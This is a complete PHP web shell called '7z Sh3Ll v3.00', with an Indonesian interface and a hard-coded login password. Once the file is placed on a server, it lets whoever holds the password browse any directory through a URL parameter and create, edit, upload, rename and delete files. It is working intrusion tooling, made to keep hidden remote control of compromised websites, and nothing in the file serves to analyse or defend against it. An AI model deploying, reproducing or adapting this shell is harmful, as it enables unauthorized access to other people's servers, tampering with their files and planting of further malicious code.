<?php
session_start();
// Terimkasih buat tim saya LOYZ and Jack Smith
$authPassword = 'kelas';
if (!isset($_SESSION['authorized'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $authPassword) {
        $_SESSION['authorized'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        echo '<form method="post" style="font-family: monospace; margin:2rem;">
                <label>Password: <input type="password" name="pass" required></label>
                <button type="submit">Login</button>
              </form>';
        exit;
    }
}

// Tangani direktori saat ini lewat parameter get "dir"
if (isset($_GET['dir'])) {
    $dir = realpath($_GET['dir']);
    if ($dir === false || !is_dir($dir)) {
        $dir = realpath(__DIR__);
    }
} else {
    $dir = realpath(__DIR__);
}

$message = '';

function safeName($name) {
    return preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $name);
}

// CREATE FOLDER
if (isset($_POST['newfolder']) && trim($_POST['newfolder']) !== '') {
    $folderName = safeName(trim($_POST['newfolder']));
    if ($folderName && !file_exists("$dir/$folderName")) {
        if (@mkdir("$dir/$folderName")) {
            $message = "Folder '$folderName' berhasil dibuat.";
        } else {
            $message = "Gagal membuat folder '$folderName'.";
        }
    } else {
        $message = "Nama folder tidak valid atau sudah ada.";
    }
}

// CREATE FILE
if (isset($_POST['newfile']) && trim($_POST['newfile']) !== '') {
    $fileName = safeName(trim($_POST['newfile']));
    $filePath = "$dir/$fileName";
    if ($fileName && !file_exists($filePath)) {
        if (file_put_contents($filePath, "") !== false) {
            $message = "File '$fileName' berhasil dibuat.";
        } else {
            $message = "Gagal membuat file '$fileName'.";
        }
    } else {
        $message = "Nama file tidak valid atau sudah ada.";
    }
}

// DELETE FILE/FOLDER
if (isset($_GET['delete'])) {
    $deleteName = safeName($_GET['delete']);
    $deletePath = "$dir/$deleteName";
    if (file_exists($deletePath)) {
        if (is_dir($deletePath)) {
            if (@rmdir($deletePath)) {
                $message = "Folder '$deleteName' berhasil dihapus.";
            } else {
                $message = "Folder '$deleteName' tidak kosong atau gagal dihapus.";
            }
        } else {
            if (@unlink($deletePath)) {
                $message = "File '$deleteName' berhasil dihapus.";
            } else {
                $message = "Gagal menghapus file '$deleteName'.";
            }
        }
    } else {
        $message = "File/folder tidak ditemukan.";
    }
}

// RENAME FILE/FOLDER
if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $oldName = safeName($_POST['rename_old']);
    $newName = safeName($_POST['rename_new']);
    $oldPath = "$dir/$oldName";
    $newPath = "$dir/$newName";

    if ($oldName && $newName && file_exists($oldPath) && !file_exists($newPath)) {
        if (@rename($oldPath, $newPath)) {
            $message = "Berhasil rename '$oldName' menjadi '$newName'.";
        } else {
            $message = "Gagal rename.";
        }
    } else {
        $message = "Nama baru sudah ada, tidak valid, atau file lama tidak ditemukan.";
    }
}

// EDIT FILE - Simpan perubahan
if (isset($_POST['edit_file']) && isset($_POST['edit_content'])) {
    $editFile = safeName($_POST['edit_file']);
    $editPath = "$dir/$editFile";
    if (file_exists($editPath) && is_file($editPath)) {
        if (file_put_contents($editPath, $_POST['edit_content']) !== false) {
            $message = "File '$editFile' berhasil disimpan.";
        } else {
            $message = "Gagal menyimpan file.";
        }
    } else {
        $message = "File tidak ditemukan.";
    }
}

// UPLOAD FILE
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
    $uploadName = basename($_FILES['upload_file']['name']);
    $uploadName = safeName($uploadName);
    $uploadPath = "$dir/$uploadName";

    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $uploadPath)) {
        $message = "File '$uploadName' berhasil diupload ke folder saat ini.";
    } else {
        $message = "Gagal upload file.";
    }
}

// Jika ingin edit, ambil isi file dulu
$editFile = null;
$editContent = '';
if (isset($_GET['edit'])) {
    $editFile = safeName($_GET['edit']);
    $editPath = "$dir/$editFile";
    if (file_exists($editPath) && is_file($editPath)) {
        $editContent = file_get_contents($editPath);
    } else {
        $editFile = null;
        $message = "File untuk diedit tidak ditemukan.";
    }
}

$files = scandir($dir);
$parentDir = dirname($dir);

// Fungsi buat breadcrumb
function makeBreadcrumb($dir) {
    $parts = explode(DIRECTORY_SEPARATOR, $dir);
    $path = '';
    $breadcrumbs = [];
    if (DIRECTORY_SEPARATOR === '\\') {
        // Windows absolute path, misal C:\folder
        // Gabungkan bagian drive dulu
        $drive = array_shift($parts);
        $path = $drive . DIRECTORY_SEPARATOR;
        $breadcrumbs[] = ['name' => $drive, 'path' => $path];
    } else {
        // Unix-like path
        $breadcrumbs[] = ['name' => '/', 'path' => DIRECTORY_SEPARATOR];
    }
    foreach ($parts as $part) {
        if ($part === '') continue;
        $path = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $part;
        $breadcrumbs[] = ['name' => $part, 'path' => $path];
    }
    return $breadcrumbs;
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<title>7z Sh3Ll v3.00</title>
<style>
  body {
    background: #0f0f23;
    color: #0ff;
    font-family: monospace;
    padding: 2rem;
    max-width: 900px;
    margin: auto;
  }
  h2 {
    color: #ff00d4;
    text-align: center;
  }
  table {
    width: 100%;
    border-collapse: collapse;
    margin-bottom: 1rem;
  }
  th, td {
    border: 1px solid #00fff7;
    padding: 6px 10px;
    text-align: left;
  }
  th {
    background: #120028;
  }
  tr:nth-child(even) {
    background: #1a1a2e;
  }
  a {
    color: #0ff;
    text-decoration: none;
  }
  a:hover {
    text-decoration: underline;
  }
  form {
    margin-bottom: 1rem;
    display: flex;
    gap: 1rem;
  }
  input[type=text], textarea {
    background: #000;
    border: 2px solid #00fff7;
    color: #0ff;
    padding: 0.5rem 1rem;
    border-radius: 8px;
    outline: none;
    font-family: monospace;
  }
  input[type=text] {
    flex-grow: 1;
  }
  button {
    background: linear-gradient(45deg, #00fff7, #ff00d4);
    border: none;
    color: #000;
    font-weight: bold;
    padding: 0.5rem 1rem;
    border-radius: 8px;
    cursor: pointer;
  }
  textarea {
    width: 100%;
    height: 300px;
    resize: vertical;
  }
  .msg {
    margin-bottom: 1rem;
    color: #0f0;
  }
  .actions form {
    display: inline-block;
    margin: 0;
  }
  /* Upload file styling */
  form.upload-form {
    margin-bottom: 1.5rem;
    display: flex;
    align-items: center;
    gap: 1rem;
  }
  form.upload-form label[for="upload_file"] {
    background: linear-gradient(45deg, #00fff7, #ff00d4);
    padding: 0.6rem 1.2rem;
    border-radius: 8px;
    color: #000;
    font-weight: bold;
    cursor: pointer;
    user-select: none;
  }
  form.upload-form input[type="file"] {
    display: none;
  }
  form.upload-form #file_name {
    color: #0ff;
    font-style: italic;
    min-width: 200px;
  }
  nav.breadcrumb {
    margin-bottom: 1.5rem;
    font-size: 0.9rem;
  }
  nav.breadcrumb a {
    color: #ff00d4;
    text-decoration: none;
    margin-right: 0.4rem;
  }
  nav.breadcrumb a:hover {
    text-decoration: underline;
  }
  nav.breadcrumb span.separator {
    margin-right: 0.4rem;
    color: #00fff7;
  }
</style>
</head>
<body>
<center><img src="https://i.imgur.com/G8Nby02.png"></img></center>
<h2>7z Sh3Ll v3.00</h2>

<?php if($message): ?>
  <div class="msg"><?= htmlspecialchars($message) ?></div>
<?php endif; ?>

<!-- Breadcrumb direktori -->
<nav class="breadcrumb">
  <?php
  $breadcrumbs = makeBreadcrumb($dir);
  $lastIndex = count($breadcrumbs) - 1;
  foreach ($breadcrumbs as $i => $crumb) {
      if ($i !== $lastIndex) {
          echo '<a href="?dir=' . urlencode($crumb['path']) . '">' . htmlspecialchars($crumb['name']) . '</a><span class="separator">/</span>';
      } else {
          echo '<span>' . htmlspecialchars($crumb['name']) . '</span>';
      }
  }
  ?>
</nav>

<?php if ($editFile): ?>
  <form method="post">
    <input type="hidden" name="edit_file" value="<?= htmlspecialchars($editFile) ?>" />
    <textarea name="edit_content"><?= htmlspecialchars($editContent) ?></textarea>
    <button type="submit">Simpan File</button>
    <a href="<?= $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir) ?>" style="color:#ff00d4; margin-left: 1rem;">Batal</a>
  </form>
<?php else: ?>

<form method="post" style="margin-bottom:1rem;">
  <input type="text" name="newfolder" placeholder="Nama folder baru..." autocomplete="off" />
  <button type="submit">Buat Folder</button>
</form>

<form method="post" style="margin-bottom:1.5rem;">
  <input type="text" name="newfile" placeholder="Nama file baru..." autocomplete="off" />
  <button type="submit">Buat File</button>
</form>

<!-- Upload File -->
<form method="post" enctype="multipart/form-data" class="upload-form">
  <label for="upload_file">Pilih File</label>
  <input type="file" name="upload_file" id="upload_file" required />
  <span id="file_name">Belum ada file dipilih</span>
  <button type="submit">Upload File</button>
</form>

<table>
  <thead>
    <tr>
      <th>Nama</th>
      <th>Tipe</th>
      <th>Ukuran (Bytes)</th>
      <th>Aksi</th>
    </tr>
  </thead>
  <tbody>
    <?php foreach ($files as $file): ?>
      <?php if ($file === '.') continue; ?>
      <tr>
        <td>
          <?php if (is_dir("$dir/$file")): ?>
            <a href="?dir=<?= urlencode(realpath("$dir/$file")) ?>"><?= htmlspecialchars($file) ?></a>
          <?php else: ?>
            <?= htmlspecialchars($file) ?>
          <?php endif; ?>
        </td>
        <td><?= is_dir("$dir/$file") ? '<b>Folder</b>' : 'File' ?></td>
        <td><?= is_file("$dir/$file") ? filesize("$dir/$file") : '-' ?></td>
        <td class="actions" style="white-space: nowrap;">
          <?php if ($file !== '..'): ?>
          <?php if (!is_dir("$dir/$file")): ?>
          <a href="?edit=<?= urlencode($file) . '&dir=' . urlencode($dir) ?>">Edit</a> |
          <?php else: ?>
          -
          <?php endif; ?>
          <a href="?delete=<?= urlencode($file) . '&dir=' . urlencode($dir) ?>" onclick="return confirm('Yakin ingin hapus <?= htmlspecialchars($file) ?>?')">Delete</a> |
          <form method="post" style="display:inline;">
            <input type="hidden" name="rename_old" value="<?= htmlspecialchars($file) ?>" />
            <input type="text" name="rename_new" placeholder="Nama baru" required style="width: 120px;" />
            <button type="submit" title="Rename">Rename</button>
          </form>
          <?php else: ?>
            -
          <?php endif; ?>
        </td>
      </tr>
    <?php endforeach; ?>
  </tbody>
</table>

<?php endif; ?>

<footer style="text-align:center; color:#0ff; margin-top:3rem;">
  Dibuat Oleh 7z &copy; 2025 7z Sh3Ll V 3.00
</footer>

<script>
  const inputFile = document.getElementById('upload_file');
  const fileNameSpan = document.getElementById('file_name');
  inputFile.addEventListener('change', () => {
    if (inputFile.files.length > 0) {
      fileNameSpan.textContent = inputFile.files[0].name;
    } else {
      fileNameSpan.textContent = 'Belum ada file dipilih';
    }
  });
</script>

</body>
</html>
